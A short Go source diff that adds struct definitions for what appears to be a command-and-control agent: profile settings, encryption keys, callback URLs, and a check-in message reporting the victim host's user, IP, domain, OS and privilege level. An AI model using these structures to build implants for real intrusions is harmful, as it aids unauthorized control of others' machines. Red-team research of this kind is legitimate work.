@@ -5,13 +5,49 @@ import (
 	"time"
 )
 
+// type definition for dynamic json envelopes
+type Msg map[string]interface{}
+
+// Struct definition for main profile config
+type Mainconfig struct {
+	UUID      string   `json:"uuid"`
+	KEYX      bool     `json:"keyx"`
+	AESPSK    string   `json:"aespsk"`
+	BaseURL   string   `json:"baseurl"`
+	BaseURLS  []string `json:"baseurls"`
+	UserAgent string   `json:"useragent"`
+	Sleep     string   `json:"sleep"`
+}
+
+type CheckInServerPayload struct {
+	Action string `json:"action"`
+	Id     string `json:"uuid"`
+	Status string `json:"status"`
+}
+
+type CheckInClientPayload struct {
+	Action         string `json:"action"`
+	User           string `json:"user"`
+	Host           string `json:"host"`
+	Pid            int    `json:"pid"`
+	IP             string `json:"ip"`
+	UUID           string `json:"uuid"`
+	OS             string `json:"os"`
+	Architecture   string `json:"architecture"`
+	Domain         string `json:"domain"`
+	ExternalIP     string `json:"external_ip"`
+	EncryptionKey  string `json:"encryption_key"`
+	DecryptionKey  string `json:"decryption_key"`
+	IntegrityLevel int    `json:"integrity_level"`
+}
+
 //Message - struct definition for external C2 messages
 type Message struct {
 	Tag    string `json:"tag"`
 	MType  int    `json:"mtype"`
 	IDType int    `json:"idtype"`
 	ID     string `json:"id"`
-	Client bool `json:"client"`
+	Client bool   `json:"client"`
 	Data   string `json:"data"`
 }
 
